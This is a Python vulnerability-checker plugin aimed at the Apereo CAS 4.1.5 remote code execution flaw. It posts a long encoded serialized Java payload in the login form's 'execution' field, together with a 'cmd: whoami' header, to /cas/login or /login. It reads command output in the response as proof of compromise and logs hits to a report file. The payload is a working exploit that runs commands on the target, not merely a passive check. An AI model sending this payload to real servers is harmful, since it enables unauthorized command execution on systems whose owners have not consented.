#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# _auther:d3ckx1



from colorama import Fore
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


class Checker_cas():

    def __init__(self):
        self.url= []
        self.name = []
        self.info = []


    def cas_4_1_rce(self):

        # vuln_info: Check the Apereo CAS 4.1.5 RCE
        # tools: https://github.com/MrMeizhi/ysoserial-mangguogan
        #

        url1 = str(self) + "cas/login"
        url2 = str(self) + "login"

        heads = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.89 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "cmd":"whoami",
        }

        data = '''
        username=test&password=test&lt=LT-2-gs2epe7hUYofoq0gI21Cf6WZqMiJyj-cas01.example.org&execution=7c1272db-09d4-400c-a50b-2ebd30e950b8_AAAAIgAAABBmqHoJBgwSjPjWj4uYfxrjAAAABmFlczEyOOk6fNkLO4U%2FRPnK7s4849HbD6y2Sy3Oh%2Bm%2FMfF4kdDF57kNTCUA%2FDOgYi5jI1UMUVCqzToG1NDVuR5lSrCoR2wNmBK8y2%2BVe6EOabxjIqs4hVoCwy6UkKJYXZJ52XvrNw%2B%2Fw5d7mwT%2BnTY61VzJ6pPG8wGbXYaFAMZkD%2FMMkfqnP6H%2FvpI2vjzcKzTYds8Dzu8%2BgHhkR6Dn4Z3jY4tBIM9Y%2Bw5M0ic5rDCS03cl4cGCGBieRpS4FGaIC8Z3eRQg%2B1J2m3wywouB0iic8qaRC60SsfvcSeUEs4143zAXmKJhyh7T7E%2BAeUF4WlwwabpsT8kA1RKxWk63hA9Tdy3crz28F5hUmySDGpih6mMvI7kRrlB8%2FJdB73FsBG2lhAbWVqxmC2jqjiLazN3rEOOGG6g2Jl%2BA%2FWhoYIDzGUUvdq8OdF0rfZHQC0FnBOwoDVf9RcFPytFF5eiQTjsvMCOsV0lsPkLYkDg%2FS2Apw9YOKH9tSXHNmFLfmf0aWxDjphVBuvMyaF7X%2BDuFI8LO0tEHsMtjUMxLFO6%2FWmkdz5J9NNRO4xvZuYcJcKS8rzUWBaiSuqGCOd%2B3lQhZRdo4jm9TMVkeAr2LmC6JKShCbuO8tDR8zxblouTTFXSDwxqGJrESZ08WDIwHFGjYQK%2FE2QHCKnPTVx4bgvIU%2BqwcsN61T7bZiwg6KpDXraJqhiIL9B6f%2FotfST9D%2F8g8CjP7HGAl42HQEyw2QXEa8p%2Ff4Rg0oUAYb8KSGvgRRz72kjRfsuAJJxsZ9n67BqkDbqpYg6iUVgfmMWY%2BielSVVQpNSmJDCcP9JAEdJ59fuMp6Hjq2AhCHX40bbvl0%2B3Tk2J3UAGg5PXCOLN6tCuObLYdC2K5sO1qZDKky47S7goCNDgjjBX%2Bvm5JNfPKCkiGzRzViVMZPrfb3zrhJiewyTq6N6jDNi2n5H8gQeQEPaAY3MKkXGRdF3%2BtplYjcH%2BB%2FG%2FUi1FeVZ0qC7Hr28xjgnE5FTRk8WZIhvtFb23wsvNVMP5JFs1nj3jyWfzkG7Oj1WYwVMSSNCqRf%2BErXIEXYs8wz62w1kI3VAajrQkG09E%2Boc5%2BvCew%2BnlJ0816FEcL7IwmyuWWITWbISSYlvsyjIVe1FkirmSb7LgicttXJqAVPgaxNM6LjBAKl0yK%2Bga6CVEcuK%2F0yc33abKDQaHDvuqv3hNjlKa0hcWLbyMr4IJDkgLa0PDMf2eV21di%2BZhnt11CQXnLFeqwgx8fXIcejnkNSix6N%2BCH6vAfsK%2BpIDQDReO3bCE5Mjk9q1U%2FONslusR78JOqHT1HIUCYFk9YAHgthQhay%2FHr%2Fi2ph%2Fem73rpMfZYaGcLDOYrIi2manSmUTUugGN9NZvGkHmLiKhFW5mZkvdlvVlWZigp%2BjPwmt3V6COmfXRnCStCMucZph2DE24zu%2BKiW5LMF351Fp%2BGHaJb%2FwuZGzKB7nSvflRSluhtxuvHLnJ1EjWy331cMDtOu%2BwWCEROnBQfCwMdmwfzYgAOfConG4L5%2F1Y5vw0cfslnzbN%2BF1c4iHi2aiz4lrrgkEF1HJNUJKHFZyMmJE4TRbFFpWZRbQFjjZeTvtclXnV31XCWddXz1B1LLO7Ik%2Bj0qClvTKaGoR%2FZbLYlPmoquYA7y5SkLMP2HXroPYQqm13Rc2tIz8sC3UeNrl%2FRtuSvfnUSodYde3vjKailPZ9IgX%2BJB2DD1j5Z6ExBupD5BZpe%2FZSEOo298PAu6ifTTAfBZim71q8sdlRObGDkreytY0F3X5GMQEh1FXIFd%2FebLkMA46Qfyh%2F4fnzLpc3xS3D0qGNuk7jLJanV9f8TqzLWBp%2BG38uY627q383IULlssCIQJB3LDBYrvsZ2i0R7hPmFSMfejv2GlQ%2BmVI7JPk%2BZ6pfF6rvcdtO9uUlUWujUphgyIfNtxAHlGlekqpy3Vg6T8GGSw2XW1NyKrsHzWzwJ8Qnti0ZhQl5ymlSXxGWdXInUDaBrbx6ygp5IznlYxzNulQwuePZwHIRbFp0Y2N9OIY%2BtnFSshy%2B0fs%2B5rI1hzPCCZcaijYurBk0uG6U3IHH2hKK0P2lDVbhR1tC7hpHM3s1%2FheF84lY5FM98ZTxh2L7dqEDA68He1W%2BNKYLWc%2By97oufjn5aZiuqXJ7Dm1i5Uqh84%2F%2FC%2F%2B9yQWtjlF6dc%2F0%2BPw8cAGD3lgtWQqecohwJ20U%2B%2B%2BnT2QkvkicR9S%2BNPN88Nd3ynuhK8tH6a8XQCAg2Aovr21PcBV1AdbKOMQ4X7fTeHwfN9nVuA9kYHFB3eVSoLwcU2RxU%2F4v9bKexOLWS6OdIMWJTBIiy8F3J%2F05CQtni4IvX7Tkk3WxCx8dPcTK7%2BVzkW5ne%2FgdPyNZpOfvZqU8j%2F59KT4W%2FHvZnBEqXNH36KHJfr0cf9BlkPNTErAFfn7kuCNAHTPC50IdCNpf54SZkLELHtkEyxkfCpUTJ7hElREKQ8Se%2BTm1nGOUHmeIoIEn4yhX54ewnCfOonqBmSfRb6kbNfPBkenPsKNpGdBMcTMwKG8OyYN%2FRgh9xekaN%2Fpp%2BrVwBkAkW28EShebSwn2bptkkvO%2BbNeRtQZucnrq%2FxCySVkProCDVEaJqO1SsBZUoeG0NgEaJouSJXgFeKNBAL%2BQ5y%2F4fiRQRWeOTpKDh9c4wjmyK3yEcNIrr931%2BAfIDOGYW5g7wDO8GiNWXteSUz%2FQnWOthuiRRm0ZLf97RB%2Bk6rdwQZV8fDflCED603YmvO%2FQV%2BbI9tQiJ58xfkjBYTPwi3hRtzy9lRDr2Lnfkn1mAe%2Fg%3D&_eventId=submit&submit=LOGIN
        '''


        try:
            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
            req = requests.post(url1, headers=heads, data=data, timeout=5, verify=False,)

            if req.status_code == 200 and 'root' in req.text or 'Administrator' in req.text or 'system' in req.text:

                report = "[+] 存在Apereo CAS 4.1.5 RCE漏洞！check-url:" + str(url1)

                print(Fore.GREEN + (report))

                output = open("Fvuln_report.txt", "a+")
                output.write(report)
                output.write('\n')

                output.close()


            else:
                try:
                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                    req = requests.post(url2, headers=heads, data=data, timeout=5, verify=False, )

                    if req.status_code == 200 and 'root' in req.text or 'Administrator' in req.text or 'system' in req.text:
                        report = "[+] 存在Apereo CAS 4.1.5 RCE漏洞！check-url:" + str(url2)

                        print(Fore.GREEN + (report))

                        output = open("Fvuln_report.txt", "a+")
                        output.write(report)
                        output.write('\n')

                        output.close()

                except:
                    pass



        except:
            pass


        return



globals()['Checker_cas'] = Checker_cas


